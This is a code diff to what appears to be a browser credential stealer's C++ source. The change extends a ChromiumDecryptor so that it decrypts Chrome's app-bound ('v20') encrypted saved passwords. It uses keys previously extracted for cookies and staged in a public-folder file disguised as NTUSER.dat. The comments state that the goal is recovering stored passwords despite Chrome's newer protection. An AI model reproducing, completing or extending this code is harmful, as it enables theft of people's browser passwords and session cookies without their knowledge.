@@ -1,4 +1,5 @@
 #include "includes\ChromiumDecryptor.h"
+#include "includes\AppBoundDecryptor.h"
 
 DATA_BLOB* master_key_blob;
 //DATA_BLOB* app_bound_master_key_blob = nullptr;
@@ -77,7 +78,7 @@ DATA_BLOB* ChromiumDecryptor::UnportectMasterKey(std::string MasterString)
 	return out;
 }
 
-std::string ChromiumDecryptor::AESDecrypter(std::vector<BYTE> EncryptedBlob)
+std::string ChromiumDecryptor::AESDecrypter(std::vector<BYTE> EncryptedBlob, std::string identifier)
 {
 	try
 	{
@@ -96,7 +97,23 @@ std::string ChromiumDecryptor::AESDecrypter(std::vector<BYTE> EncryptedBlob)
 
 		// Compare the first 3 bytes with the string "v20"
 		if (meta == "v20")
+		{
+			//Needs to run app-bound-decryption mode before using this
+			//Because Chrome is now saving passwords with app-bound-encryption
+			//Since already extracting keys for cookies in app-bound-decryption mode, will use those!
+
+			std::string service_data_path = "c:\\users";
+			service_data_path += "\\public\\";
+			service_data_path += "NTUSER.dat";
+
+			AppBoundDecryptor obj;
+			if (obj.AppBoundDecryptorInit(service_data_path, identifier))
+			{
+				std::string decrypted_passwords = obj.AESDecrypter(EncryptedBlob);
+				return decrypted_passwords;
+			}
 			return "";
+		}
 
 		// Parse iv and password from the buffer using std::copy
 		std::copy(EncryptedBlob.data() + 3, EncryptedBlob.data() + 3 + IV_SIZE, IV.begin());
